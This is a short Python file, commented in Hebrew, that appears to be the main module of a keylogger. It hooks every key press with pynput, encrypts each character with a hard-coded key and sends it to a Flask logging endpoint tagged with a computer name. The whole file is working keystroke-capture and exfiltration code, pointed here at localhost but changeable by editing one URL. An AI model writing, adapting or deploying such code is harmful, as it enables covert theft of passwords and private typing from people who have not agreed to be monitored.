from pynput import keyboard
from encryptor import Encryptor
from network_writer import NetworkWriter

def main():
    # יוצר מצפין עם מפתח
    encryptor = Encryptor("my-secret-key")

    # שולח לשרת Flask (server.py)
    network_writer = NetworkWriter(
        server_url="http://127.0.0.1:8000/log",  # כתובת ה-Flask
        computer_name="PC1"  # שם המחשב
    )

    def on_press(key):
        try:
            char = key.char if hasattr(key, "char") and key.char else str(key)
        except:
            char = str(key)

        # הצפנה
        encrypted = encryptor.encrypt(char)

        # שליחה לשרת (network_writer → Flask)
        network_writer.write(encrypted)

    # מאזין ללחיצות מקשים
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
